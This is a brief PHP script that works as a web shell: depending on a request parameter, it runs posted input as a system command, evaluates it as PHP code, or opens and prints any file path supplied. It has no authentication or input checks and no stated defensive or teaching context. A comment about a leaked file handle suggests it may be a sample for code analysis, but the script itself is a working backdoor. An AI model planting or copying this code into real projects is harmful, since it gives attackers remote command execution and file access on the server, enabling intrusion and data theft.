<?php
$action = $_GET['action'];
$input = $_POST['data'];

if ($action === 'exec') {
    system($input);
} elseif ($action === 'eval') {
    eval($input);
} elseif ($action === 'read') {
    $fh = fopen($input, 'r');
    echo fread($fh, 4096);
    // fh leaked
}
?>
